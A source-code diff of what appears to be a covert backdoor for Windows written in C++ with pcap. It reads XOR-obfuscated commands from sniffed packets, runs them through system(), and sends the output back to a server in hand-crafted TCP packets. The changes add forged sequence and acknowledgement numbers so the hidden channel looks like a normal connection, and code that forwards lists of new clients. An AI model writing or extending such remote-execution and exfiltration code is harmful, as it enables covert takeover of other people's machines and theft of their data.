@@ -124,16 +124,16 @@ std::string find_curr_dir();
 int startup_finder();
 int size_of_list(pcap_if_t*  list);
 pcap_t* get_handle(pcap_if_t** first_device);
-int decapsulate(const u_char *data, int size, int id_num);
+int decapsulate(const u_char *data, int size, int id_num, int* seq_num, int* ack_num);
 pcap_if_t* capture_em_packets();
 void get_mac(mac_values** values);
 void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses);
 void get_ip(std::vector<std::string>& ip_addresses);
 int send_packet(std::string address, std::string mac_addr, std::string option, int id_num);
-int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num);
+int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num, int seq_num, int ack_num);
 int add_to_net(std::string address, std::string mac_addr);
 int command_check(std::string command);
-void send_clients(std::string address, std::string mac_addr);
+int send_clients(std::string address, std::string mac_addr, int seq_num, int ack_num);
 
 /*
  *This is the capture thread
@@ -172,15 +172,16 @@ DWORD WINAPI capture(PVOID pPARAM) {
 
 	//free dev list
 	pcap_freealldevs(device);
+	//IP and TCP important connection fields
 	int packet_id = 0;
-	//capture packets on dev
-	/////////infinite loop need to change///////////
+	int sequence_number =1;
+	int acknowledgement_numer=0;
+	//////////capture packets on dev///////////////
 	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
 		
 		//inspect packet
 		if (pktHeader->len > 0) {
-			
-			packet_id = decapsulate(pkt_data, pktHeader->caplen, packet_id);
+			packet_id = decapsulate(pkt_data, pktHeader->caplen, packet_id, &sequence_number, &acknowledgement_numer);
 		}
 	}
 	///////////////////////////////////////////////
@@ -269,7 +270,7 @@ int add_to_net(std::string address, std::string mac_addr) {
 				for (int i = 0; i < command_len; i++) {
 					command[i] = command[i] ^ 'H';
 				}
-				connected_mode_send(bytes[0], mac_address, "1", command, id_num);
+				connected_mode_send(bytes[0], mac_address, "1", command, id_num, 0,0);
 			}
 		}
 		myfile.close();
@@ -313,14 +314,14 @@ int command_check(std::string command) {
  *This function will send the server any new clients
  *return: nothing
  */
-void send_clients(std::string address, std::string mac_addr) {
+int send_clients(std::string address, std::string mac_addr, int seq_num, int ack_num) {
 	std::ifstream myfile("add_to_net.txt");
 	if (myfile.is_open()) {
 		while (!myfile.eof()) {
 			std::string line;
 			getline(myfile, line);
 			int line_len = line.length();
-			if (line_len > 30) {
+			if (line_len > 24) {
 				std::vector<std::string> bytes;
 				split(line, ' ', bytes);
 				int id_num = rand() % 7000;
@@ -336,7 +337,9 @@ void send_clients(std::string address, std::string mac_addr) {
 				for (int i = 0; i < command_len; i++) {
 					command[i] = command[i] ^ 'H';
 				}
-				connected_mode_send(address, mac_addr, "1", command, id_num);
+				
+				connected_mode_send(address, mac_addr, "1", command, id_num, seq_num, ack_num);
+				seq_num = command_len + 12 + seq_num;
 			}
 		}
 		myfile.close();
@@ -348,6 +351,7 @@ void send_clients(std::string address, std::string mac_addr) {
 		outfile << "added";
 		outfile.close();
 	}
+	return seq_num;
 }
 
 /*
@@ -605,7 +609,7 @@ pcap_t* get_handle(pcap_if_t** first_device) {
 *and call functions if needed
 *renturns nothing
 */
-int decapsulate(const u_char *data, int size, int id_num) {
+int decapsulate(const u_char *data, int size, int id_num, int* seq_num, int* ack_num) {
 	eth_header* eth_hdr;
 	eth_hdr = (eth_header*)data;
 	IPv4* ih;
@@ -695,6 +699,7 @@ int decapsulate(const u_char *data, int size, int id_num) {
 							//check for client ip and mac
 							if (command_check(command) == 0) {
 								//run command
+								(*ack_num) = command.length() + (*ack_num) +12;
 								command = command + " > test.txt";
 								int return_val = system(command.c_str());
 								//read output from file
@@ -715,10 +720,11 @@ int decapsulate(const u_char *data, int size, int id_num) {
 								}
 								//std::cout << result.length() << std::endl;
 								//add check for new clients here
-								send_clients(address, mac_address);
+								(*seq_num) = send_clients(address, mac_address, (*seq_num), (*ack_num));
 								//return result to server
 								identification_number++;
-								connected_mode_send(address, mac_address, "1", result, identification_number);
+								connected_mode_send(address, mac_address, "1", result, identification_number, (*seq_num), (*ack_num));
+								(*seq_num) = (*seq_num) + 12 + res_len;
 								return identification_number;
 							}
 							else {
@@ -1095,7 +1101,7 @@ int send_packet(std::string address, std::string mac_addr, std::string option, i
 *Used to send ip packets
 *returns: success of packet being sent
 */
-int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num) {
+int connected_mode_send(std::string address, std::string mac_addr, std::string option, std::string command, int id_num, int seq_num, int ack_num) {
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
@@ -1161,6 +1167,18 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 			}
 			myfile.close();
 		}
+		//sequence number
+		packet[38] = seq_num / 16777216;
+		packet[39] = seq_num / 65536;
+		packet[40] = seq_num / 256;
+		packet[41] = seq_num % 256;
+
+		//sequence number
+		packet[42] = ack_num / 16777216;
+		packet[43] = ack_num / 65536;
+		packet[44] = ack_num / 256;
+		packet[45] = ack_num % 256;
+
 		//last byte in urgent pointer
 		packet[53] = 0;
 
